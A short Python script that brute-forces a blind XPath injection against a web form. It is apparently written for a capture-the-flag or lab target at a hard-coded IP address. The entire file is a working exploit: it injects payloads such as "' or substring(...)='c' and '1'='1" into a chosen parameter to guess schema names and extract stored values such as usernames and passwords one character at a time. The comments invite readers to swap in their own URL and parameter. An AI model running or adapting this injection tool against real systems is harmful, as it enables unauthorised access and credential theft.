import requests

from string import *

# short basic script to bruteforce a blindXPathInjection
# when trying to discover the schema name, wrap the path with the name() function
# after remove it and exfiltrate values :)


CONTAINS_TEXT = "Message successfully sent!" # change this to whatever differentiates a successful injection from a failed one
URL = "http://94.237.55.163:30177/index.php" # change to your url
DATA = {"username": "admin", "msg":"qweqwe" } # change to your data
PARAM_TO_INJECT = "username" # change to your vulnerable param

TEST_QUERY = f"invalid' or string-length(name(/*[1])) = 1 and '1'='1"

characters = ascii_letters + digits + "{}_"

print(characters)

#space to draw your schema :)
'''
<accounts>
    <acc>
        <username/>
        <password/>
        <>
    </acc>
</accounts>
'''



def find_len():
    found = False
    length = 1
    while not found:
        inject_data = DATA.copy()
        inject_data[PARAM_TO_INJECT] = f"invalid' or string-length(/accounts/acc/username) = {length} and '1'='1"
        print(inject_data)
        r = requests.post(URL, inject_data)
        contents = r.text
        if CONTAINS_TEXT in r.text: 
            found = True
            break
        
        length+=1

    return length

def find_child_count():
    found = False
    length = 1
    while not found:
        inject_data = DATA.copy()
        inject_data[PARAM_TO_INJECT] = f"invalid' or count(/accounts/acc/*[2]) = {length} and '1'='1"
        print(inject_data)
        r = requests.post(URL, inject_data)
        contents = r.text
        if CONTAINS_TEXT in r.text: 
            found = True
            break
        
        length += 1

    return length

def bruteforce_value():
    value_length = find_len()
    value = ""
    while len(value) < value_length: 
        for c in printable:
            current_value = value + c
            print(f"Trying {current_value}")
            inject_data = DATA.copy()
            inject_data[PARAM_TO_INJECT] = f"invalid' or substring(name(/accounts/acc/username),{len(value) + 1},1)='{c}' and '1'='1"
            r = requests.post(URL, inject_data) #change to your url

            contents = r.text

            if CONTAINS_TEXT in contents:
                value += c
                break

    return value            

if __name__ == "__main__":
    print(bruteforce_value())
